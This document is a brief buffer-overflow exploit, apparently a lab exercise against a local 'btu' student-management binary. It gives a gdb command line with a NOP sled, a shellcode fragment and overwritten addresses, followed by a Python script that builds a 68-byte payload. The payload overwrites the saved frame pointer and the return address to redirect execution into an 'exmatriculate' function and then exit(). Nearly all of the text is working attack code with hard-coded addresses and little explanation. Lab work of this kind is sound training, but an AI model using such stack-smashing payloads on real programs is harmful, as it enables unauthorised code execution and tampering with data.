'''
gdb --args ./build/bin/btu remove 1782914303 $(echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\xb0\x01\x31\xdb\xb3\x05\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xbb\xb0\x04\x08\xbb\xbb\xbb\xbb\xe0\x0d\x05\x08\x50\x7d\x05\x08")
'''

#!/usr/bin/python3 

# x/100s *((char **)environ) this is the command we use inside gdb to get the address of 'bin/bash
import sys 


# Fill content with non-zero values 
content = bytearray(0x90 for i in range(68)) 

ebp= 0xffffcdb8 #address of ebp

content[48:52] = (ebp).to_bytes(4, byteorder='little')

system_addr = 0x0804b080#The address of exmatriculate 

content[52:56] = (system_addr).to_bytes(4, byteorder='little' )


exit_addr = 0xf7afbad0#address of exit()

content[56:60] = (exit_addr).to_bytes(4, byteorder='little' ) 

btu_obj = 0x08050c80 # address of btu object. 
content[60:64] = (btu_obj).to_bytes(4, byteorder='little') 

student_addr = 1782914303   # hex value of student

content[64:68] = (student_addr).to_bytes(4, byteorder='little') 




# Print the final payload in escaped format for gdb --args
escaped = ''.join('\\x{:02x}'.format(b) for b in content)



print(f'gdb --args ./build/bin/btu remove 1782914303 $(echo -e "{escaped}")')

